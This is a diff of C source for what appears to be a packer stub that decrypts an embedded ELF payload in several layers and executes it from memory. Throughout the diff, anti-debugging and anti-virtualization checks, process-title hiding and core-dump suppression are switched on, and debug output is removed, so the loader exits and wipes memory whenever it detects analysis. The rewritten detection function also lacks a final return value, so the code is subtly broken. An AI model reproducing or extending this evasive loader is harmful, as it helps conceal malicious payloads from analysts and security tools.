@@ -176,33 +176,32 @@ int check_debug_environment(void) {
 }
 
 int comprehensive_anti_debug_check() {
-    int detection_score = 0;
-
+    
+    // This logic can be expanded
     if (detect_ptrace_arm64()) {
-        detection_score += 4;
+        return 1;
     }
     if (check_proc_status()) {
-        detection_score += 4;
+        return 1;
     }
     if (check_parent_process()) {
-        detection_score += 3;
+        return 1;
     }
     if (detect_virtualization()) {
-        detection_score += 2;
+        return 1;
     }
     if (check_debug_environment()) {
-        detection_score += 1;
+        return 1;
     }
 
-    return detection_score >= 4; // Threshold for detection
 }
 
 
 void multi_layer_decrypt(uint8_t* data, size_t len, const pack_header_t* header) {
     
-    //rc4_encrypt_decrypt(header->tertiary_key, 32, data, data, len);
+    rc4_encrypt_decrypt(header->tertiary_key, 32, data, data, len);
     
-    //chacha20_decrypt(data, len, header->secondary_key, header->nonce);
+    chacha20_decrypt(data, len, header->secondary_key, header->nonce);
 
     aes256_decrypt(data, len, header->primary_key);
     
@@ -227,8 +226,8 @@ int main(int argc, char* argv[], char* envp[]) {
     uint8_t* decrypted_data;
     uint32_t calculated_crc;
 
-    //prevent_core_dumps();
-    //hide_process_title(argc, argv);
+    prevent_core_dumps();
+    hide_process_title(argc, argv);
 
     self_fp = fopen("/proc/self/exe", "rb");
     if (!self_fp) {
@@ -254,29 +253,24 @@ int main(int argc, char* argv[], char* envp[]) {
     fclose(self_fp);
 
     header = find_packed_header(self_data, self_size);
-    printf("finding header\n");
     if (!header) {
         secure_memory_wipe(self_data, self_size);
         free(self_data);
         return 1;
     }
 
-    /*if (comprehensive_anti_debug_check()) {
-        printf("Debugger or analysis environment detected. Exiting.\n");
+    if (comprehensive_anti_debug_check()) {
         secure_memory_wipe(self_data, self_size);
         free(self_data);
         exit(0);
-    }*/
+    }
 
     encrypted_data = (uint8_t*)header + sizeof(pack_header_t);
-    printf("Packed size %d",header->packed_size);
-    printf("Original header %d",header->original_size);
     if (encrypted_data + header->packed_size > self_data + self_size) {
         secure_memory_wipe(self_data, self_size);
         free(self_data);
         return 1;
     }
-    printf("decrypting\n");
     decrypted_data = malloc(header->original_size);
     if (!decrypted_data) {
         secure_memory_wipe(self_data, self_size);
@@ -287,7 +281,6 @@ int main(int argc, char* argv[], char* envp[]) {
     memcpy(decrypted_data, encrypted_data, header->original_size);
 
     multi_layer_decrypt(decrypted_data, header->original_size, header);
-    printf("verifying CRC\n");
     calculated_crc = crc32(decrypted_data, header->original_size);
     if (calculated_crc != header->crc32) {
         secure_memory_wipe(decrypted_data, header->original_size);
@@ -296,25 +289,20 @@ int main(int argc, char* argv[], char* envp[]) {
         free(self_data);
         return 1;
     }
-    printf("verifying ELF\n");
     if (!is_elf64(decrypted_data)) {
-        printf("Not ELF\n");
         secure_memory_wipe(decrypted_data, header->original_size);
         secure_memory_wipe(self_data, self_size);
         free(decrypted_data);
         free(self_data);
         return 1;
     } 
-    printf("Debuging check\n");
     if (comprehensive_anti_debug_check()) {
-        printf("Debugger MAX or analysis environment detected after decryption. Exiting.\n");
         secure_memory_wipe(decrypted_data, header->original_size);
         secure_memory_wipe(self_data, self_size);
         free(decrypted_data);
         free(self_data);
         exit(0);
     }
-    printf("Executing from memory\n");
     if (execute_from_memory(decrypted_data, header->original_size, argv, envp) < 0) {
         secure_memory_wipe(decrypted_data, header->original_size);
         secure_memory_wipe(self_data, self_size);
